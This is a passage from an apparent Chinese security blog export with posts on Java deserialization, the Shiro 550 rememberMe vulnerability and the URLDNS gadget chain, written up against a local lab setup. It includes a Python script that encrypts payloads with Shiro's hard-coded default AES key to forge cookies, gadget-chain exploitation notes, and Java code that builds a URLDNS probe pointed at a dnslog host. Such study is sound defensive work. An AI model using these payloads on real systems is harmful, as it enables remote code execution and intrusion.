<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(二)-最好用的CC链</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化</title>
    <url>/2024/05/21/JAVA%E5%AE%89%E5%85%A8/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="为什么JAVA需要反序列化"><a href="#为什么JAVA需要反序列化" class="headerlink" title="为什么JAVA需要反序列化"></a>为什么JAVA需要反序列化</h2><p><strong>1. 数据持久化</strong></p>
<p>序列化可以将 Java 对象转换为字节序列，并将其存储到文件中或数据库中，该字节包含对象的数据、对象的类型、对象的存储属性。这使得 Java 程序可以很容易地保存和加载数据，而无需每次都重新创建对象。例如，一个 Java 应用程序可以将用户数据序列化到文件中，以便在下次启动时加载。</p>
<p><strong>2. 远程通信</strong></p>
<p>序列化还可以用于在网络上传输 Java 对象。例如，一个 Java 应用程序可以将一个对象序列化并发送给另一个应用程序，或者将一个对象从客户端发送到服务器。这使得 Java 程序可以很容易地在不同的机器之间共享数据。</p>
<h2 id="序列化与反序列化的实现"><a href="#序列化与反序列化的实现" class="headerlink" title="序列化与反序列化的实现"></a>序列化与反序列化的实现</h2><p>序列化对象会通过<code>ObjectOutputStream</code>的<code>writeObject</code>方法将一个对象写入到文件中。</p>
<p>而反序列化是使用了<code>ObjectInputStream类</code>的<code>readObject</code> 方法进行读取并还原成在序列化前的一个类。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>定义了一个Person类，实现了<strong>Serializable</strong>接口，有两个属性和一个构造方法，重写了<code>toString()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135149134.png" alt="image-20240521135149134"></p>
<p>可以看到<strong>Serializable</strong>是空接口，可以理解为是一个标记，实现了它才能序列化。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135203323.png" alt="image-20240521135203323"></p>
<p>定义了一个serialize静态方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135344209.png" alt="image-20240521135344209"></p>
<p>序列化的结果</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135254681.png" alt="image-20240521135254681"></p>
<p>反序列化：还原成在序列化前的一个类。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135403252.png" alt="image-20240521135403252"></p>
<h2 id="为什么会产生安全问题"><a href="#为什么会产生安全问题" class="headerlink" title="为什么会产生安全问题"></a>为什么会产生安全问题</h2><p>序列化的数据，上传到服务器，如果服务器有反序列化的操作，那其中的代码一定会执行，给予了攻击者在服务器执行代码的能力。</p>
<p>(传入一个序列化数据，服务器反序列化操作一定会执行<code>readObject()</code>方法)</p>
<h2 id="寻找入口类"><a href="#寻找入口类" class="headerlink" title="寻找入口类"></a>寻找入口类</h2><p>怎么算是一个好的入口类？实现了<code>Serializable</code>接口,重写了readObject，参数类型宽泛，最好JDK自带。</p>
<p>这样我们很容易就会想到Map，HashMap实现了<strong>Serializable</strong>接口，重写了<code>readObject()</code>方法。（在类里面重写了<code>readObject()</code>方法，JDK会自动调用重写的<code>readObject()</code>方法，而不调用原生的<code>readObject()</code>）<img src="https://image.sp4rks.xyz/2024/06/image-20240521141902419.png" alt="image-20240521141902419"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521142108326.png" alt="image-20240521142108326"></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化Shiro 550分析</title>
    <url>/2024/06/09/JAVA%E5%AE%89%E5%85%A8/Shiro550/</url>
    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p><strong>影响版本</strong>：Shiro &lt;&#x3D; 1.2.4</p>
<p><strong>漏洞根本原因</strong>:固定key加密</p>
<p><strong>Shiro特征</strong>：返回包中包含rememberMe&#x3D;deleteMe字段。</p>
<p>Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</p>
<p><a href="https://blog.csdn.net/qq_36551991/article/details/118031254">Shiro介绍</a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li><p>JDK8u202</p>
</li>
<li><p>tomcat 8.5.100</p>
</li>
<li><p>Shiro 1.2.4</p>
</li>
</ul>
<h3 id="下载tomcat"><a href="#下载tomcat" class="headerlink" title="下载tomcat"></a>下载tomcat</h3><p><a href="https://tomcat.apache.org/download-80.cgi">tomcat8</a>(下载好后解压)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240609144237140.png" alt="image-20240609144237140"></p>
<p>启动tomcat后发现日志是乱码</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240531212732532.png" alt="image-20240531212732532"></p>
<p>找到这个位置把UTF-8改为GBK</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240531213058211.png" alt="image-20240531213058211"></p>
<p><code>Windows</code><strong>下的<code>CMD</code>的默认字符集是<code>GBK</code>，所以<code>UTF8</code>编码输出的日志，中文看到的肯定是乱码了。</strong></p>
<hr>
<h3 id="下载shiro环境"><a href="#下载shiro环境" class="headerlink" title="下载shiro环境"></a>下载shiro环境</h3><p>p牛的环境:<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">shirodemo</a></p>
<p>编辑项目设置</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240609150059572.png" alt="image-20240609150059572"></p>
<p>添加tomcat</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240609150152218.png" alt="image-20240609150152218"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240609150612269.png" alt="image-20240609150612269"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611180441211.png" alt="image-20240611180441211"></p>
<p>默认账号:root   </p>
<p>默认密码:secret</p>
<h2 id="Shiro-Cookie处理流程分析"><a href="#Shiro-Cookie处理流程分析" class="headerlink" title="Shiro Cookie处理流程分析"></a>Shiro Cookie处理流程分析</h2><h3 id="加密流程分析"><a href="#加密流程分析" class="headerlink" title="加密流程分析"></a>加密流程分析</h3><p><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiro反序列化漏洞(一)-shiro550流程分析</a></p>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>比较重要的几个类的继承关系</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+-----------------------------------+</span><br><span class="hljs-section">| RememberMeManager  &lt;&lt;interface&gt;&gt;  |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-code">          ^</span><br><span class="hljs-section">          |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-section">|  AbstractRememberMeManager        |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-code">          ^</span><br><span class="hljs-section">          |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-section">|     CookieRememberMeManager       |</span><br><span class="hljs-section">+-----------------------------------+</span><br></code></pre></td></tr></table></figure>

<hr>
<p><strong>RememberMeManager</strong></p>
<p><code>RememberMeManager</code>接口提供了以下方法：</p>
<ul>
<li><code>getRememberedPrincipals()</code>：RememberMe 的功能。</li>
<li><code>forgetIdentity()</code>：忘记用户身份标识。</li>
<li><code>onSuccessfulLogin()</code>：登录校验成功时调用，保存当前用户的<code>principals</code>以供应用程序以后调用。</li>
<li><code>onFailedLogin()</code>：登录校验失败时调用，忘记当前用户的<code>principals</code>。</li>
<li><code>onLogout()</code>：用户退出登录时调用，忘记当前用户的<code>principals</code>。</li>
</ul>
<p><strong>AbstractRememberMeManager</strong></p>
<p><code>AbstractRememberMeManager</code>是实现<code>RememberMeManger</code>接口类的抽象类，这里有几个比较重要的成员变量需要了解：</p>
<ul>
<li><code> DEFAULT_CIPHER_KEY_BYTES</code>：一个硬编码 AES KEY，该 KEY 会被设置为加解密 KEY 的成员变量。</li>
<li><code>serializer</code>：Shiro 的序列化器，用来对序列化和反序列化标识用户身份的<code>PrincipalCollection</code>对象。</li>
<li><code>cipherService</code>：用于数据加解密的类，实际上是<code>org.apache.shiro.crypto.AesCipherService</code>类。</li>
</ul>
<p><strong>CookieRememberMeManager</strong></p>
<p><code>getRememberedSerializedIdentity()</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;<br>	<br>    	<span class="hljs-comment">//如果不是 HTTP 相关联的实例，记录调试信息并返回 null</span><br>       <span class="hljs-keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;<br>           <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>               <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +<br>                       <span class="hljs-string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +<br>                       <span class="hljs-string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;<br>               log.debug(msg);<br>           &#125;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br>	<br>    	<span class="hljs-comment">//调用 isIdentityRemoved(wsc) 方法检查身份是否已移除。如果已移除，返回 null。</span><br>       <span class="hljs-type">WebSubjectContext</span> <span class="hljs-variable">wsc</span> <span class="hljs-operator">=</span> (WebSubjectContext) subjectContext;<br>       <span class="hljs-keyword">if</span> (isIdentityRemoved(wsc)) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br>	<br>    	<span class="hljs-comment">//获取 HTTP 请求和响应对象:</span><br>       <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> WebUtils.getHttpRequest(wsc);<br>       <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> WebUtils.getHttpResponse(wsc);<br>	<br>    	<span class="hljs-comment">/*</span><br><span class="hljs-comment">    		读取并处理cookie:调用 getCookie().readValue(request, response) 读取“记住我”cookie 的值。</span><br><span class="hljs-comment">		检查 cookie 是否已被删除（Cookie.DELETED_COOKIE_VALUE），如果是，则返回 null。</span><br><span class="hljs-comment">		如果 cookie 存在，对其进行 Base64 解码。</span><br><span class="hljs-comment">		记录解码后的信息（如果启用了详细日志）。</span><br><span class="hljs-comment">		返回解码后的字节数组。</span><br><span class="hljs-comment">	*/</span>	<br>       <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> getCookie().readValue(request, response);<br>       <span class="hljs-comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span><br>       <span class="hljs-comment">// ignore cookies that are scheduled for removal</span><br>       <span class="hljs-keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>       <span class="hljs-keyword">if</span> (base64 != <span class="hljs-literal">null</span>) &#123;<br>           base64 = ensurePadding(base64);<br>           <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>               log.trace(<span class="hljs-string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="hljs-string">&quot;]&quot;</span>);<br>           &#125;<br>           <span class="hljs-type">byte</span>[] decoded = Base64.decode(base64);<br>           <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>               log.trace(<span class="hljs-string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="hljs-literal">null</span> ? decoded.length : <span class="hljs-number">0</span>) + <span class="hljs-string">&quot; bytes.&quot;</span>);<br>           &#125;<br>           <span class="hljs-keyword">return</span> decoded;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-comment">//no cookie set - new site visitor?</span><br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>



<h2 id="Shiro-550漏洞利用"><a href="#Shiro-550漏洞利用" class="headerlink" title="Shiro 550漏洞利用"></a>Shiro 550漏洞利用</h2><h3 id="CC11链攻击"><a href="#CC11链攻击" class="headerlink" title="CC11链攻击"></a>CC11链攻击</h3><p>外部库中有CC3.2.1，正好是有漏洞的版本</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611200459717.png" alt="image-20240611200459717"></p>
<p>加密脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> email.mime <span class="hljs-keyword">import</span> base<br><span class="hljs-keyword">from</span> pydoc <span class="hljs-keyword">import</span> plain<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> turtle <span class="hljs-keyword">import</span> mode<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br> <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br> <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br> BS = AES.block_size<br> pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.MODE_CBC<br> iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br> encryptor = AES.new(base64.b64decode(key), mode, iv)<br> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br> <span class="hljs-keyword">return</span> ciphertext<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br> enc_data = base64.b64decode(enc_data)<br> unpad = <span class="hljs-keyword">lambda</span> s: s[:-s[-<span class="hljs-number">1</span>]]<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.MODE_CBC<br> iv = enc_data[:<span class="hljs-number">16</span>]<br> encryptor = AES.new(base64.b64decode(key), mode, iv)<br> plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br> plaintext = unpad(plaintext)<br> <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br> data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br> <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure>

<p>这个脚本的意思就是先aes加密，再base64编码，符合shiro逻辑</p>
<p>对CC11的序列化数据编码</p>
<p>当Cookie中有JSESSIONID时，不会通过rememberMe的数据进行身份认证，就执行不了我们构造好的EXP</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611211916791.png" alt="image-20240611211916791"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611211931741.png" alt="image-20240611211931741"></p>
<h3 id="CB链攻击"><a href="#CB链攻击" class="headerlink" title="CB链攻击"></a>CB链攻击</h3><p>因为原生的Shiro并不带CC依赖，但是包含了commons-beanutils，所以参考<a href="https://sp4rks3.github.io/2024/06/08/JAVA%E5%AE%89%E5%85%A8/CB%E9%93%BE/">Java反序列化CommonsBeanutils链</a></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213742442.png" alt="image-20240611213742442"></p>
<p>用之前的CB链打，报错信息为<code>org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962</code></p>
<p>这是因为CB版本不一致导致的</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213705631.png" alt="image-20240611213705631"></p>
<p>Shiro环境中commons-beanutils版本为1.8.3</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213801082.png" alt="image-20240611213801082"></p>
<p>最简单的接解决办法就是把之前本地环境中commons-beanutils的版本变为Shiro的commons-beanutils版本</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213925075.png" alt="image-20240611213925075"></p>
<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://blog.csdn.net/qq_36551991/article/details/118031254">Shiro学习之路（一）：Shiro是什么？有什么用</a></p>
<p><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiro反序列化漏洞(一)-shiro550流程分析</a></p>
<p><a href="https://www.bilibili.com/video/BV1dq4y1B76x/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiro反序列化漏洞(二)-shiro下的CC链利用</a></p>
<p><a href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.788&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiro反序列化漏洞(三)-shiro无依赖利用链</a></p>
<p><a href="https://github.com/dota-st/JavaSec/blob/master/04-Shiro%E4%B8%93%E5%8C%BA/1-Shiro%E4%B9%8BCVE-2016-4437/index.md">CVE-2016-4437漏洞分析</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>RULDNS链</title>
    <url>/2024/05/09/JAVA%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/</url>
    <content><![CDATA[<h2 id="URLDNS链优点"><a href="#URLDNS链优点" class="headerlink" title="URLDNS链优点"></a>URLDNS链优点</h2><ol>
<li>使⽤Java内置的类构造，对第三⽅库没有依赖</li>
<li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
</ol>
<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>ysoserial 中URLDNS链 ， 看这个利用链只涉及两个类<strong>HashMap</strong>和<strong>URL</strong>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509090622554.png" alt="image-20240509090622554"></p>
<h3 id="HashMap类"><a href="#HashMap类" class="headerlink" title="HashMap类"></a>HashMap类</h3><p><strong>HashMap</strong>自己实现了<code>readObject()</code>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509093642516.png" alt="image-20240509093642516"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br></code></pre></td></tr></table></figure>

<p>putVal重新计算了key的hash，跟进<code>hash()</code>（Ctrl+鼠标左键）</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509093734192.png" alt="image-20240509093734192"></p>
<p>代码意思是如果key为null返回0，如果不为null，则调用key的<code>hashCode()</code>。</p>
<p>那我们思考，假如有个a类有<code>hashCode()</code>方法，把a类作为hashMap的key，在这里就相当于调用a类的<code>hashCode()</code>，这就是同名函数调用。</p>
<h3 id="URL类"><a href="#URL类" class="headerlink" title="URL类"></a>URL类</h3><p>承接上文，<strong>URL</strong>类中有<code>hashCode()</code>方法,<code>hashCode()</code>被handler调用，handler 又是 <strong>URLStreamHandler</strong> 的抽象类，我们再去找 <strong>URLStreamHandler</strong> 的 <code>hashCode()</code> 方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509102412486.png" alt="image-20240509102412486"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p><code>hashCode()</code>方法传入一个url，<code>getHostAddress(url)</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509103443938.png" alt="image-20240509103443938"></p>
<p>进入<code>getHostAddress()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509103838469.png" alt="image-20240509103838469"></p>
<p>这段代码意思是获取给定 URL 对象的主机地址。如果主机地址已经缓存过，则直接返回缓存的地址；否则，尝试解析主机名获取主机地址，并缓存结果。在⽹络上其实就是⼀次 DNS 查询。</p>
<p><strong>流程</strong></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 首先通过HashMap的readObject函数,会调用putVal()函数计算hasHmap的key</span><br><span class="hljs-number">1</span>. HashMap -&gt; <span class="hljs-built_in">readObject</span>() -&gt; <span class="hljs-built_in">putVal</span>() -&gt; <span class="hljs-built_in">hash</span>(key) <br><span class="hljs-comment">//hash(Object key)会对key调用hashCode()</span><br><span class="hljs-number">2</span>. key<span class="hljs-selector-class">.hashCode</span>()<br><span class="hljs-comment">// 如果传入的key 是一个URL对象</span><br><span class="hljs-number">3</span>. key = URL url<br><span class="hljs-comment">// 然后会触发URL对象hashcode()</span><br><span class="hljs-number">4</span>. url<span class="hljs-selector-class">.hashcode</span>()<br><span class="hljs-comment">// 如果hashcode不为-1,就会调用handler的hashcode,并且传入url</span><br><span class="hljs-number">5</span>. url<span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.hashcode</span>(url)<br><span class="hljs-comment">// 在handler的hashcode里面会调用getHostAddress,参数是url</span><br><span class="hljs-number">6</span>. <span class="hljs-built_in">getHostAddress</span>(url)<br><span class="hljs-comment">// 最后发起一次dns请求</span><br><span class="hljs-number">7</span>. dns请求<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>参考上面的流程，我们需要创建一个hashMap，在hashMap的key传入url对象，看<strong>URL</strong>的构造方法，最简单的构造方法直接放入一个url地址就可以</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509145326944.png" alt="image-20240509145326944"></p>
<p>hashMap不直接直接传参，必须用<code>put()</code>方法，put进去。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509145753562.png" alt="image-20240509145753562"></p>
<p>如果一切顺利的话</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 首先通过HashMap的readObject函数,会调用putVal()函数计算hasHmap的key</span><br><span class="hljs-number">1</span>. HashMap -&gt; <span class="hljs-built_in">readObject</span>() -&gt; <span class="hljs-built_in">putVal</span>() -&gt; <span class="hljs-built_in">hash</span>(key) <br><span class="hljs-comment">//hash(Object key)会对key调用hashCode()</span><br><span class="hljs-number">2</span>. key<span class="hljs-selector-class">.hashCode</span>()<br><span class="hljs-comment">// 如果传入的key 是一个URL对象</span><br><span class="hljs-number">3</span>. key = URL url<br><span class="hljs-comment">// 然后会触发URL对象hashcode()</span><br><span class="hljs-number">4</span>. url<span class="hljs-selector-class">.hashcode</span>()<br><span class="hljs-comment">// 如果hashcode不为-1,就会调用handler的hashcode,并且传入url</span><br><span class="hljs-number">5</span>. url<span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.hashcode</span>(url)<br><span class="hljs-comment">// 在handler的hashcode里面会调用getHostAddress,参数是url</span><br><span class="hljs-number">6</span>. <span class="hljs-built_in">getHostAddress</span>(url)<br><span class="hljs-comment">// 最后发起一次dns请求</span><br><span class="hljs-number">7</span>. dns请求<br></code></pre></td></tr></table></figure>

<h3 id="初遇难题"><a href="#初遇难题" class="headerlink" title="初遇难题"></a>初遇难题</h3><p>但是我们发现在序列化的时候就已经触发了</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509150138622.png" alt="image-20240509150138622"></p>
<p>跟进<strong>hashMap</strong>的<code>put()</code>方法，发现在put的时候就已经对key进行一次<code>hash()</code>了，触发了<strong>URL</strong>类的<code>hashCode()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509111302937.png" alt="image-20240509111302937"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509152432465.png" alt="image-20240509152432465"></p>
<p>我们发现，当 <code>hashCode</code> 的值不等于 -1 的时候，函数就会直接 <code>return hashCode</code> 而不执行 <code>hashCode = handler.hashCode(this);</code>。而一开始定义 HashMap 类的时候<code>hashCode</code> 的值为 -1，便是发起了请求。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509152449960.png" alt="image-20240509152449960"></p>
<h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>思路：在put前，使hashCode不等于-1，put后hashCode等于-1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <br>         <span class="hljs-comment">//思路</span><br>        <span class="hljs-comment">//HashMap&lt;URL, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br>        <span class="hljs-comment">//将hashCOde值改为不是-1，put()的时候就不会发起请求</span><br>        <span class="hljs-comment">//URL url = new URL(&quot;http://jhc0ym.dnslog.cn&quot;);</span><br>       <br>        <span class="hljs-comment">//hashMap.put(url, 1);</span><br>        <span class="hljs-comment">//将hashCode值改为-1</span><br>        <br>        <span class="hljs-comment">//Serialization(hashMap);</span><br>        <br>        <span class="hljs-comment">//实现</span><br>        HashMap&lt;URL, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <span class="hljs-comment">//新建一个hashMap</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://jhc0ym.dnslog.cn&quot;</span>);  <span class="hljs-comment">//url</span><br>        <br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URL</span>&gt; c = url.getClass();  <span class="hljs-comment">//获取一个Class</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <span class="hljs-comment">//获取hashCode字段</span><br>        hashCodefile.setAccessible(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//设置字段访问权限</span><br>        hashCodefile.set(url, <span class="hljs-number">123</span>);	 <span class="hljs-comment">//将hashCode改为123</span><br><br><br>        hashMap.put(url, <span class="hljs-number">1</span>);<br>        hashCodefile.set(url, -<span class="hljs-number">1</span>);  <span class="hljs-comment">//put完后改为-1</span><br><span class="hljs-comment">//        Serialization(hashMap);</span><br>        Deserialization(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Serialization</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123; <span class="hljs-comment">//序列化</span><br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        outputStream.writeObject(obj);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Deserialization</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException 